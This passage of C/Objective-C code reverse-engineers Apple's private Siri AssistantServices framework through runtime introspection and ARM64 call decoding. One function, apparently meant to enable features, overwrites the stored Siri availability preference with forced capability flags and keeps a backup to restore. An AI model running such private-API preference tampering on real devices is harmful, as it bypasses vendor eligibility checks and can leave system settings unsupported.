    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) {
        snprintf(out, cap, "AssistantServices=NOT_LOADED\n");
        return out;
    }

    Class cls = objc_getClass("AFSystemAssistantExperienceStatusManager");
    SEL selector = sel_registerName("fetchGenerativeModelsAvailability");
    Method method = cls ? class_getInstanceMethod(cls, selector) : NULL;
    if (!method) {
        snprintf(out, cap, "method=NOT_FOUND\n");
        dlclose(assistant);
        return out;
    }
    IMP implementation = method_getImplementation(method);
    void *code = (void *)implementation;
#if __has_include(<ptrauth.h>) && defined(__arm64e__)
    code = ptrauth_strip(code, ptrauth_key_function_pointer);
#endif
    Dl_info info = {0};
    dladdr(code, &info);
    uintptr_t address = (uintptr_t)code;
    uintptr_t base = (uintptr_t)info.dli_fbase;
    len += snprintf(out + len, cap - len,
                    "method=-[AFSystemAssistantExperienceStatusManager fetchGenerativeModelsAvailability]\n"
                    "address=0x%llx imageOffset=0x%llx types=%s\n",
                    (unsigned long long)address,
                    (unsigned long long)(base ? address - base : 0),
                    method_getTypeEncoding(method));
    const unsigned char *p = (const unsigned char *)code;
    for (size_t offset = 0; offset < 1536 && len + 80 < cap; offset += 16) {
        len += snprintf(out + len, cap - len, "%04llx:",
                        (unsigned long long)offset);
        for (size_t j = 0; j < 16; j++)
            len += snprintf(out + len, cap - len, "%02x", p[offset + j]);
        len += snprintf(out + len, cap - len, "\n");
    }
    dlclose(assistant);
    return out;
}

char *siri_refresh_call_map(void) {
    const size_t cap = 32768;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) {
        snprintf(out, cap, "AssistantServices=NOT_LOADED\n");
        return out;
    }
    Class cls = objc_getClass("AFSystemAssistantExperienceStatusManager");
    Method method = cls ? class_getInstanceMethod(
        cls, sel_registerName("fetchGenerativeModelsAvailability")) : NULL;
    if (!method) {
        snprintf(out, cap, "method=NOT_FOUND\n");
        dlclose(assistant);
        return out;
    }
    void *code = (void *)method_getImplementation(method);
#if __has_include(<ptrauth.h>) && defined(__arm64e__)
    code = ptrauth_strip(code, ptrauth_key_function_pointer);
#endif
    uintptr_t start = (uintptr_t)code;
    const uint32_t *ins = (const uint32_t *)code;
    len += snprintf(out + len, cap - len, "refreshIMP=0x%llx\n",
                    (unsigned long long)start);

    for (size_t n = 0; n < 268 && len + 256 < cap; n++) { // through method return
        uint32_t instruction = ins[n];
        if ((instruction & 0xFC000000U) != 0x94000000U) continue; // BL imm26
        int64_t immediate = (int64_t)(instruction & 0x03FFFFFFU);
        if (immediate & 0x02000000LL) immediate |= ~0x03FFFFFFLL;
        uintptr_t source = start + n * 4;
        uintptr_t target = (uintptr_t)((int64_t)source + (immediate << 2));
        Dl_info info = {0};
        dladdr((void *)target, &info);

        const char *selector_name = NULL;
        const uint32_t *stub = (const uint32_t *)target;
        // objc_msgSend stubs begin ADRP x1; ADD x1, x1, #imm; B dispatcher.
        if ((stub[0] & 0x9F00001FU) == 0x90000001U &&
            (stub[1] & 0xFFC003FFU) == 0x91000021U) {
            uintptr_t selector_page = decode_adrp_target(target, stub[0]);
            uint64_t add_imm = (stub[1] >> 10) & 0xFFF;
            if ((stub[1] >> 22) & 1) add_imm <<= 12;
            selector_name = (const char *)(selector_page + add_imm);
        }
        len += snprintf(out + len, cap - len,
                        "+0x%04llx target=0x%llx selector=%s nearest=%s\n",
                        (unsigned long long)(n * 4),
                        (unsigned long long)target,
                        selector_name ? selector_name : "-",
                        info.dli_sname ? info.dli_sname : "-");
    }
    dlclose(assistant);
    return out;
}

typedef struct {
    uint64_t words[5];
} siri_capabilities_t;

static void append_cf_description(char *out, size_t cap, size_t *len,
                                  const char *label, CFTypeRef value) {
    if (!value) {
        *len += snprintf(out + *len, cap - *len, "%s=<nil>\n", label);
        return;
    }
    CFStringRef description = CFCopyDescription(value);
    char buffer[2048] = {0};
    if (description && CFStringGetCString(description, buffer, sizeof(buffer),
                                         kCFStringEncodingUTF8)) {
        *len += snprintf(out + *len, cap - *len, "%s=%s\n", label, buffer);
    } else {
        *len += snprintf(out + *len, cap - *len, "%s=<unprintable>\n", label);
    }
    if (description) CFRelease(description);
}

char *siri_availability_probe(void) {
    const size_t cap = 16384;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) {
        snprintf(out, cap, "AssistantServices=NOT_LOADED\n");
        return out;
    }

    Class manager_class = objc_getClass("AFSystemAssistantExperienceStatusManager");
    id manager = manager_class ? ((id (*)(id, SEL))objc_msgSend)(
        (id)manager_class, sel_registerName("sharedManager")) : nil;
    id availability = manager ? ((id (*)(id, SEL))objc_msgSend)(
        manager, sel_registerName("fetchSiriAvailability")) : nil;
    if (!availability) {
        snprintf(out, cap, "fetchSiriAvailability=<nil>\n");
        dlclose(assistant);
        return out;
    }

    Class availability_class = object_getClass(availability);
    Method all_method = class_getInstanceMethod(availability_class,
                                                 sel_registerName("allCapabilities"));
    Method mode_method = class_getInstanceMethod(availability_class,
                                                  sel_registerName("desiredOrchestrationMode"));
    len += snprintf(out + len, cap - len,
                    "availabilityClass=%s allCapabilities.types=%s desiredMode.types=%s\n",
                    object_getClassName(availability),
                    all_method ? method_getTypeEncoding(all_method) : "?",
                    mode_method ? method_getTypeEncoding(mode_method) : "?");

    siri_capabilities_t capabilities =
        ((siri_capabilities_t (*)(id, SEL))objc_msgSend)(
            availability, sel_registerName("allCapabilities"));
    int64_t desired_mode = ((int64_t (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("desiredOrchestrationMode"));
    bool available = ((bool (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("isAvailable"));
    for (int i = 0; i < 5; i++) {
        len += snprintf(out + len, cap - len, "allCapabilities.word%d=0x%llx\n",
                        i, (unsigned long long)capabilities.words[i]);
    }
    uint64_t system_caps = capabilities.words[2];
    uint64_t visual_caps = capabilities.words[4];
    len += snprintf(out + len, cap - len,
                    "systemCaps=0x%llx required=0x27 missing=0x%llx\n"
                    "visualCaps=0x%llx required=0x1f missing=0x%llx\n"
                    "desiredOrchestrationMode=%lld isAvailable=%d\n",
                    (unsigned long long)system_caps,
                    (unsigned long long)(0x27ULL & ~system_caps),
                    (unsigned long long)visual_caps,
                    (unsigned long long)(0x1FULL & ~visual_caps),
                    (long long)desired_mode, available ? 1 : 0);

    typedef CFTypeRef (*caps_string_fn)(uint64_t);
    caps_string_fn system_string = (caps_string_fn)dlsym(
        assistant, "NSStringFromAFSiriSystemAssistantExperienceCapabilities");
    caps_string_fn visual_string = (caps_string_fn)dlsym(
        assistant, "NSStringFromAFSiriVisualIntelligenceCapabilities");
    if (system_string) {
        append_cf_description(out, cap, &len, "systemCaps.description",
                              system_string(system_caps));
        append_cf_description(out, cap, &len, "systemMissing.description",
                              system_string(0x27ULL & ~system_caps));
    }
    if (visual_string) {
        append_cf_description(out, cap, &len, "visualCaps.description",
                              visual_string(visual_caps));
        append_cf_description(out, cap, &len, "visualMissing.description",
                              visual_string(0x1FULL & ~visual_caps));
    }
    dlclose(assistant);
    return out;
}

char *siri_availability_runtime_map(void) {
    const size_t cap = 32768;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) {
        snprintf(out, cap, "AssistantServices=NOT_LOADED\n");
        return out;
    }
    Class manager_class = objc_getClass("AFSystemAssistantExperienceStatusManager");
    id manager = manager_class ? ((id (*)(id, SEL))objc_msgSend)(
        (id)manager_class, sel_registerName("sharedManager")) : nil;
    id availability = manager ? ((id (*)(id, SEL))objc_msgSend)(
        manager, sel_registerName("fetchSiriAvailability")) : nil;
    Class cls = availability ? object_getClass(availability) : objc_getClass("AFSiriAvailability");
    if (!cls) {
        snprintf(out, cap, "AFSiriAvailability=NOT_FOUND\n");
        dlclose(assistant);
        return out;
    }
    len += snprintf(out + len, cap - len, "class=%s instanceSize=%zu\n",
                    class_getName(cls), class_getInstanceSize(cls));

    unsigned int count = 0;
    Method *methods = class_copyMethodList(cls, &count);
    len += snprintf(out + len, cap - len, "[instance methods] count=%u\n", count);
    for (unsigned int i = 0; i < count && len + 256 < cap; i++) {
        len += snprintf(out + len, cap - len, "%s types=%s\n",
                        sel_getName(method_getName(methods[i])),
                        method_getTypeEncoding(methods[i]));
    }
    free(methods);

    Class meta = object_getClass(cls);
    methods = class_copyMethodList(meta, &count);
    len += snprintf(out + len, cap - len, "[class methods] count=%u\n", count);
    for (unsigned int i = 0; i < count && len + 256 < cap; i++) {
        len += snprintf(out + len, cap - len, "%s types=%s\n",
                        sel_getName(method_getName(methods[i])),
                        method_getTypeEncoding(methods[i]));
    }
    free(methods);

    objc_property_t *properties = class_copyPropertyList(cls, &count);
    len += snprintf(out + len, cap - len, "[properties] count=%u\n", count);
    for (unsigned int i = 0; i < count && len + 256 < cap; i++) {
        len += snprintf(out + len, cap - len, "%s attrs=%s\n",
                        property_getName(properties[i]),
                        property_getAttributes(properties[i]));
    }
    free(properties);

    Ivar *ivars = class_copyIvarList(cls, &count);
    len += snprintf(out + len, cap - len, "[ivars] count=%u\n", count);
    for (unsigned int i = 0; i < count && len + 256 < cap; i++) {
        len += snprintf(out + len, cap - len, "%s type=%s offset=%td\n",
                        ivar_getName(ivars[i]), ivar_getTypeEncoding(ivars[i]),
                        ivar_getOffset(ivars[i]));
    }
    free(ivars);
    dlclose(assistant);
    return out;
}

static void append_availability_details(char *out, size_t cap, size_t *len,
                                        const char *prefix, id availability) {
    if (!availability) {
        *len += snprintf(out + *len, cap - *len, "%s=<nil>\n", prefix);
        return;
    }
    int64_t status = ((int64_t (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("status"));
    uint64_t restrictions = ((uint64_t (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("restrictionReasons"));
    uint64_t unavailable = ((uint64_t (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("unavailabilityReasons"));
    uint64_t desired = ((uint64_t (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("desiredOrchestrationMode"));
    uint64_t desired_enabled = ((uint64_t (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("desiredOrchestrationModeIfEnabled"));
    uint64_t current = ((uint64_t (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("currentOrchestrationMode"));
    bool available = ((bool (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("isAvailable"));
    bool current_boot = ((bool (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("fromCurrentBoot"));
    bool capable_ignoring_setting = ((bool (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("isLinwoodCapableIgnoringUserSetting"));
    bool capable_ever = ((bool (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("isLinwoodCapableAndEverAvailable"));
    siri_capabilities_t capabilities =
        ((siri_capabilities_t (*)(id, SEL))objc_msgSend)(
            availability, sel_registerName("allCapabilities"));
    *len += snprintf(out + *len, cap - *len,
                     "[%s] status=%lld available=%d restrictions=0x%llx unavailable=0x%llx\n"
                     "[%s] desired=%llu desiredIfEnabled=%llu current=%llu currentBoot=%d\n"
                     "[%s] linwoodIgnoringSetting=%d linwoodEver=%d caps=%llx,%llx,%llx,%llx,%llx\n",
                     prefix, (long long)status, available ? 1 : 0,
                     (unsigned long long)restrictions, (unsigned long long)unavailable,
                     prefix, (unsigned long long)desired,
                     (unsigned long long)desired_enabled, (unsigned long long)current,
                     current_boot ? 1 : 0, prefix,
                     capable_ignoring_setting ? 1 : 0, capable_ever ? 1 : 0,
                     (unsigned long long)capabilities.words[0],
                     (unsigned long long)capabilities.words[1],
                     (unsigned long long)capabilities.words[2],
                     (unsigned long long)capabilities.words[3],
                     (unsigned long long)capabilities.words[4]);

    id dictionary = ((id (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("toDictionary"));
    id dump = ((id (*)(id, SEL))objc_msgSend)(
        availability, sel_registerName("dumpDescription"));
    char label[128];
    snprintf(label, sizeof(label), "%s.dictionary", prefix);
    append_cf_description(out, cap, len, label, (CFTypeRef)dictionary);
    snprintf(label, sizeof(label), "%s.dump", prefix);
    append_cf_description(out, cap, len, label, (CFTypeRef)dump);

    for (uint64_t mode = 2; mode <= 5; mode++) {
        id missing = ((id (*)(id, SEL, uint64_t))objc_msgSend)(
            availability, sel_registerName("missingDesiredCapabilitiesFor:"), mode);
        snprintf(label, sizeof(label), "%s.missingForMode%llu", prefix,
                 (unsigned long long)mode);
        append_cf_description(out, cap, len, label, (CFTypeRef)missing);
    }
}

char *siri_availability_detail_probe(void) {
    const size_t cap = 32768;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) {
        snprintf(out, cap, "AssistantServices=NOT_LOADED\n");
        return out;
    }
    Class manager_class = objc_getClass("AFSystemAssistantExperienceStatusManager");
    id manager = manager_class ? ((id (*)(id, SEL))objc_msgSend)(
        (id)manager_class, sel_registerName("sharedManager")) : nil;
    id live = manager ? ((id (*)(id, SEL))objc_msgSend)(
        manager, sel_registerName("fetchSiriAvailability")) : nil;
    Class availability_class = objc_getClass("AFSiriAvailability");
    id preferences = availability_class ? ((id (*)(id, SEL))objc_msgSend)(
        (id)availability_class, sel_registerName("fromPreferences")) : nil;
    append_availability_details(out, cap, &len, "live", live);
    append_availability_details(out, cap, &len, "preferences", preferences);
    dlclose(assistant);
    return out;
}

char *siri_preferences_source_map(void) {
    const size_t cap = 32768;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) {
        snprintf(out, cap, "AssistantServices=NOT_LOADED\n");
        return out;
    }
    Class availability_class = objc_getClass("AFSiriAvailability");
    Method method = availability_class ? class_getClassMethod(
        availability_class, sel_registerName("fromPreferences")) : NULL;
    if (!method) {
        snprintf(out, cap, "fromPreferences=NOT_FOUND\n");
        dlclose(assistant);
        return out;
    }
    void *code = (void *)method_getImplementation(method);
#if __has_include(<ptrauth.h>) && defined(__arm64e__)
    code = ptrauth_strip(code, ptrauth_key_function_pointer);
#endif
    uintptr_t start = (uintptr_t)code;
    const uint32_t *ins = (const uint32_t *)code;
    len += snprintf(out + len, cap - len, "fromPreferences.IMP=0x%llx types=%s\n",
                    (unsigned long long)start, method_getTypeEncoding(method));
    for (size_t n = 0; n < 192 && len + 256 < cap; n++) {
        uint32_t instruction = ins[n];
        if ((instruction & 0xFC000000U) != 0x94000000U) continue;
        int64_t immediate = (int64_t)(instruction & 0x03FFFFFFU);
        if (immediate & 0x02000000LL) immediate |= ~0x03FFFFFFLL;
        uintptr_t source = start + n * 4;
        uintptr_t target = (uintptr_t)((int64_t)source + (immediate << 2));
        Dl_info info = {0};
        dladdr((void *)target, &info);
        const char *selector_name = NULL;
        const uint32_t *stub = (const uint32_t *)target;
        if ((stub[0] & 0x9F00001FU) == 0x90000001U &&
            (stub[1] & 0xFFC003FFU) == 0x91000021U) {
            uintptr_t selector_page = decode_adrp_target(target, stub[0]);
            uint64_t add_imm = (stub[1] >> 10) & 0xFFF;
            if ((stub[1] >> 22) & 1) add_imm <<= 12;
            selector_name = (const char *)(selector_page + add_imm);
        }
        len += snprintf(out + len, cap - len,
                        "+0x%04llx selector=%s nearest=%s\n",
                        (unsigned long long)(n * 4),
                        selector_name ? selector_name : "-",
                        info.dli_sname ? info.dli_sname : "-");
        // Most class factories are short; stop after the first return window.
        if (n > 96) break;
    }

    const char *class_names[] = { "AFPreferences", "AFSiriPreferences", NULL };
    for (int c = 0; class_names[c]; c++) {
        Class cls = objc_getClass(class_names[c]);
        if (!cls) continue;
        len += snprintf(out + len, cap - len, "[%s relevant methods]\n", class_names[c]);
        unsigned int count = 0;
        Method *methods = class_copyMethodList(cls, &count);
        for (unsigned int i = 0; i < count && len + 256 < cap; i++) {
            const char *name = sel_getName(method_getName(methods[i]));
            if (strstr(name, "Avail") || strstr(name, "avail") ||
                strstr(name, "Orches") || strstr(name, "orches") ||
                strstr(name, "Capab") || strstr(name, "capab") ||
                strstr(name, "Siri") || strstr(name, "siri")) {
                len += snprintf(out + len, cap - len, "%s types=%s\n",
                                name, method_getTypeEncoding(methods[i]));
            }
        }
        free(methods);
    }
    dlclose(assistant);
    return out;
}

char *siri_preferences_key_probe(void) {
    const size_t cap = 16384;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen(
        "/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices",
        RTLD_NOW | RTLD_LOCAL);
    if (!assistant) {
        snprintf(out, cap, "AssistantServices=NOT_LOADED\n");
        return out;
    }
    Class cls = objc_getClass("AFSiriAvailability");
    Method method = cls ? class_getClassMethod(cls, sel_registerName("fromPreferences")) : NULL;
    if (!method) {
        snprintf(out, cap, "fromPreferences=NOT_FOUND\n");
        dlclose(assistant);
        return out;
    }
    void *code = (void *)method_getImplementation(method);
#if __has_include(<ptrauth.h>) && defined(__arm64e__)
    code = ptrauth_strip(code, ptrauth_key_function_pointer);
#endif
    uintptr_t start = (uintptr_t)code;
    const uint32_t *ins = (const uint32_t *)code;
    uintptr_t key_page = decode_adrp_target(start + 0x18, ins[6]);
    uint64_t key_imm = (ins[7] >> 10) & 0xFFF;
    if ((ins[7] >> 22) & 1) key_imm <<= 12;
    CFTypeRef key = (CFTypeRef)(key_page + key_imm);
    uintptr_t context_page = decode_adrp_target(start + 0x20, ins[8]);
    uint64_t context_imm = (ins[9] >> 10) & 0xFFF;
    if ((ins[9] >> 22) & 1) context_imm <<= 12;
    CFTypeRef context = (CFTypeRef)(context_page + context_imm);
    append_cf_description(out, cap, &len, "key", key);
    append_cf_description(out, cap, &len, "context", context);

    typedef CFTypeRef (*value_fn)(CFTypeRef, CFTypeRef, CFTypeRef);
    value_fn read_value = (value_fn)dlsym(assistant, "_AFPreferencesValueForKeyWithContext");
    if (!read_value) read_value = (value_fn)dlsym(assistant, "AFPreferencesValueForKeyWithContext");
    if (read_value) {
        CFTypeRef value = read_value(key, context, NULL);
        append_cf_description(out, cap, &len, "currentValue", value);
    } else {
        len += snprintf(out + len, cap - len, "reader=NO_SYMBOL\n");
    }

    const char *setters[] = {
        "_AFPreferencesSetValueForKeyWithContext",
        "AFPreferencesSetValueForKeyWithContext",
        "_AFPreferencesSetValueForKey",
        "AFPreferencesSetValueForKey",
        "_AFPreferencesSetValue",
        "AFPreferencesSetValue",
        NULL
    };
    for (int i = 0; setters[i]; i++) {
        len += snprintf(out + len, cap - len, "%s=%s\n", setters[i],
                        dlsym(assistant, setters[i]) ? "PRESENT_NOT_CALLED" : "NO_SYMBOL");
    }
    dlclose(assistant);
    return out;
}

// operation: 0 = unchanged ABI test, 1 = apply SAE, 2 = restore backup.
char *siri_preferences_write(int operation) {
    const size_t cap = 16384;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen("/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices", RTLD_NOW | RTLD_LOCAL);
    if (!assistant) { snprintf(out, cap, "AssistantServices=NOT_LOADED\n"); return out; }

    typedef CFTypeRef (*value_fn)(CFTypeRef, CFTypeRef, CFTypeRef);
    typedef void (*set_fn)(CFTypeRef, CFTypeRef, CFTypeRef, CFTypeRef);
    value_fn reader = (value_fn)dlsym(assistant, "_AFPreferencesValueForKeyWithContext");
    set_fn setter = (set_fn)dlsym(assistant, "_AFPreferencesSetValueForKeyWithContext");
    if (!reader || !setter) {
        snprintf(out, cap, "reader=%s setter=%s\n", reader ? "OK" : "MISSING", setter ? "OK" : "MISSING");
        dlclose(assistant); return out;
    }
    CFStringRef key = CFSTR("SiriAvailability");
    CFStringRef context = CFSTR("com.apple.assistant.backedup");
    CFTypeRef current = reader(key, context, NULL);
    if (!current || CFGetTypeID(current) != CFDictionaryGetTypeID()) {
        append_cf_description(out, cap, &len, "current", current);
        dlclose(assistant); return out;
    }

    CFTypeRef target = current;
    CFPropertyListRef saved = NULL;
    if (operation == 1) {
        CFPreferencesSetAppValue(CFSTR("AIEnablerSiriAvailabilityBackup"), current, kCFPreferencesCurrentApplication);
        Boolean synced = CFPreferencesAppSynchronize(kCFPreferencesCurrentApplication);
        len += snprintf(out + len, cap - len, "backup=%s\n", synced ? "SAVED" : "SYNC_FAILED");
        CFMutableDictionaryRef patched = CFDictionaryCreateMutableCopy(NULL, 0, (CFDictionaryRef)current);
        CFDictionaryRef old_caps = CFDictionaryGetValue((CFDictionaryRef)current, CFSTR("allCapabilities"));
        CFMutableDictionaryRef caps = old_caps && CFGetTypeID(old_caps) == CFDictionaryGetTypeID() ? CFDictionaryCreateMutableCopy(NULL, 0, old_caps) : NULL;
        if (!patched || !caps) {
            if (patched) CFRelease(patched); if (caps) CFRelease(caps);
            snprintf(out + len, cap - len, "patch=FAILED_BAD_DICTIONARY\n");
            dlclose(assistant); return out;
        }
        int64_t sae = 0x37, visual = 0x1f, mode = 4;
        CFNumberRef sae_n = CFNumberCreate(NULL, kCFNumberSInt64Type, &sae);
        CFNumberRef visual_n = CFNumberCreate(NULL, kCFNumberSInt64Type, &visual);
        CFNumberRef mode_n = CFNumberCreate(NULL, kCFNumberSInt64Type, &mode);
        CFDictionarySetValue(caps, CFSTR("saeCapabilities"), sae_n);
        CFDictionarySetValue(caps, CFSTR("visualIntelligenceCapabilities"), visual_n);
        CFDictionarySetValue(patched, CFSTR("allCapabilities"), caps);
        CFDictionarySetValue(patched, CFSTR("desiredOrchestrationMode"), mode_n);
        CFDictionarySetValue(patched, CFSTR("desiredOrchestrationModeIfEnabled"), mode_n);
        CFDictionarySetValue(patched, CFSTR("currentOrchestrationMode"), mode_n);
        CFRelease(sae_n); CFRelease(visual_n); CFRelease(mode_n); CFRelease(caps);
        target = patched;
    } else if (operation == 2) {
        saved = CFPreferencesCopyAppValue(CFSTR("AIEnablerSiriAvailabilityBackup"), kCFPreferencesCurrentApplication);
        if (!saved || CFGetTypeID(saved) != CFDictionaryGetTypeID()) {
            snprintf(out, cap, "backup=NOT_FOUND\n"); if (saved) CFRelease(saved);
            dlclose(assistant); return out;
        }
        target = saved;
    }
    append_cf_description(out, cap, &len, "before", current);
    // Cocoa private setters conventionally receive value before key. The
    // trailing zero is harmless if this exact build consumes only 3 args.
    setter(target, key, context, NULL);
    CFTypeRef after = reader(key, context, NULL);
    append_cf_description(out, cap, &len, "after", after);
    len += snprintf(out + len, cap - len, "readbackEqual=%d operation=%d\n", after && CFEqual(target, after), operation);
    if (operation == 1 && target != current) CFRelease(target);
    if (saved) CFRelease(saved);
    dlclose(assistant);
    return out;
}

static bool availability_related_name(const char *name) {
    return name && (strstr(name, "Avail") || strstr(name, "avail") ||
                    strstr(name, "Capab") || strstr(name, "capab") ||
                    strstr(name, "Orches") || strstr(name, "orches") ||
                    strstr(name, "Refresh") || strstr(name, "refresh") ||
                    strstr(name, "Update") || strstr(name, "update") ||
                    strstr(name, "Fetch") || strstr(name, "fetch") ||
                    strstr(name, "Save") || strstr(name, "save"));
}

char *siri_availability_writer_inventory(void) {
    const size_t cap = 65536;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen("/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices", RTLD_NOW | RTLD_LOCAL);
    if (!assistant) { snprintf(out, cap, "AssistantServices=NOT_LOADED\n"); return out; }
    int count = objc_getClassList(NULL, 0);
    Class *classes = count > 0 ? calloc((size_t)count, sizeof(Class)) : NULL;
    if (!classes) { snprintf(out, cap, "classList=FAILED\n"); dlclose(assistant); return out; }
    count = objc_getClassList(classes, count);
    for (int i = 0; i < count && len + 1024 < cap; i++) {
        const char *cn = class_getName(classes[i]);
        if (!cn || (!strstr(cn, "Siri") && !strstr(cn, "Assistant") && !strstr(cn, "Availability"))) continue;
        bool wrote_header = false;
        unsigned int mc = 0;
        Method *methods = class_copyMethodList(classes[i], &mc);
        for (unsigned int j = 0; j < mc && len + 512 < cap; j++) {
            const char *mn = sel_getName(method_getName(methods[j]));
            if (!availability_related_name(mn)) continue;
            if (!wrote_header) { len += snprintf(out + len, cap - len, "[%s]\n", cn); wrote_header = true; }
            len += snprintf(out + len, cap - len, "- %s types=%s\n", mn, method_getTypeEncoding(methods[j]));
        }
        free(methods);
        Class meta = object_getClass(classes[i]);
        mc = 0; methods = class_copyMethodList(meta, &mc);
        for (unsigned int j = 0; j < mc && len + 512 < cap; j++) {
            const char *mn = sel_getName(method_getName(methods[j]));
            if (!availability_related_name(mn)) continue;
            if (!wrote_header) { len += snprintf(out + len, cap - len, "[%s]\n", cn); wrote_header = true; }
            len += snprintf(out + len, cap - len, "+ %s types=%s\n", mn, method_getTypeEncoding(methods[j]));
        }
        free(methods);
    }
    free(classes);
    len += snprintf(out + len, cap - len, "read-only; no methods invoked\n");
    dlclose(assistant);
    return out;
}

char *siri_capabilities_client_runtime(void) {
    const size_t cap = 32768;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen("/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices", RTLD_NOW | RTLD_LOCAL);
    if (!assistant) { snprintf(out, cap, "AssistantServices=NOT_LOADED\n"); return out; }
    const char *names[] = { "SOSiriCapabilitiesServiceClient", "AFSiriCapabilitiesServiceClient", "AFSystemAssistantExperienceStatusManager", NULL };
    for (int n = 0; names[n] && len + 2048 < cap; n++) {
        Class cls = objc_getClass(names[n]);
        if (!cls) { len += snprintf(out + len, cap - len, "[%s] NOT_FOUND\n", names[n]); continue; }
        len += snprintf(out + len, cap - len, "[%s] instanceSize=%zu superclass=%s\n", names[n], class_getInstanceSize(cls), class_getName(class_getSuperclass(cls)));
        unsigned int count = 0;
        Method *methods = class_copyMethodList(cls, &count);
        len += snprintf(out + len, cap - len, "instanceMethods=%u\n", count);
        for (unsigned int i = 0; i < count && len + 512 < cap; i++)
            len += snprintf(out + len, cap - len, "- %s types=%s\n", sel_getName(method_getName(methods[i])), method_getTypeEncoding(methods[i]));
        free(methods);
        Class meta = object_getClass(cls);
        methods = class_copyMethodList(meta, &count);
        len += snprintf(out + len, cap - len, "classMethods=%u\n", count);
        for (unsigned int i = 0; i < count && len + 512 < cap; i++)
            len += snprintf(out + len, cap - len, "+ %s types=%s\n", sel_getName(method_getName(methods[i])), method_getTypeEncoding(methods[i]));
        free(methods);
        objc_property_t *props = class_copyPropertyList(cls, &count);
        len += snprintf(out + len, cap - len, "properties=%u\n", count);
        for (unsigned int i = 0; i < count && len + 512 < cap; i++)
            len += snprintf(out + len, cap - len, "%s attrs=%s\n", property_getName(props[i]), property_getAttributes(props[i]));
        free(props);
        Ivar *ivars = class_copyIvarList(cls, &count);
        len += snprintf(out + len, cap - len, "ivars=%u\n", count);
        for (unsigned int i = 0; i < count && len + 512 < cap; i++)
            len += snprintf(out + len, cap - len, "%s type=%s offset=%td\n", ivar_getName(ivars[i]), ivar_getTypeEncoding(ivars[i]), ivar_getOffset(ivars[i]));
        free(ivars);
    }
    len += snprintf(out + len, cap - len, "read-only; clients not instantiated\n");
    dlclose(assistant);
    return out;
}

char *siri_capabilities_service_sync_probe(void) {
    const size_t cap = 8192;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen("/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices", RTLD_NOW | RTLD_LOCAL);
    if (!assistant) { snprintf(out, cap, "AssistantServices=NOT_LOADED\n"); return out; }
    Class cls = objc_getClass("AFSiriCapabilitiesServiceClient");
    if (!cls) { snprintf(out, cap, "clientClass=NOT_FOUND\n"); dlclose(assistant); return out; }
    id client = ((id (*)(id, SEL))objc_msgSend)((id)cls, sel_registerName("alloc"));
    client = client ? ((id (*)(id, SEL))objc_msgSend)(client, sel_registerName("init")) : nil;
    if (!client) { snprintf(out, cap, "client=INIT_FAILED\n"); dlclose(assistant); return out; }
    id before = ((id (*)(id, SEL))objc_msgSend)(client, sel_registerName("connection"));
    append_cf_description(out, cap, &len, "connection.before", (CFTypeRef)before);
    SEL sae_sel = sel_registerName("siriSystemAssistantExperienceEnabledSync");
    SEL assets_sel = sel_registerName("shouldDownloadAssetsForSiriSystemAssistantExperienceSync");
    SEL intents_sel = sel_registerName("siriWithAppIntentsEnabledSync");
    bool sae = class_getInstanceMethod(cls, sae_sel) ? ((bool (*)(id, SEL))objc_msgSend)(client, sae_sel) : false;
    bool assets = class_getInstanceMethod(cls, assets_sel) ? ((bool (*)(id, SEL))objc_msgSend)(client, assets_sel) : false;
    bool intents = class_getInstanceMethod(cls, intents_sel) ? ((bool (*)(id, SEL))objc_msgSend)(client, intents_sel) : false;
    len += snprintf(out + len, cap - len, "service.SAE=%d\nservice.shouldDownloadAssets=%d\nservice.AppIntents=%d\n", sae, assets, intents);
    id after = ((id (*)(id, SEL))objc_msgSend)(client, sel_registerName("connection"));
    append_cf_description(out, cap, &len, "connection.after", (CFTypeRef)after);
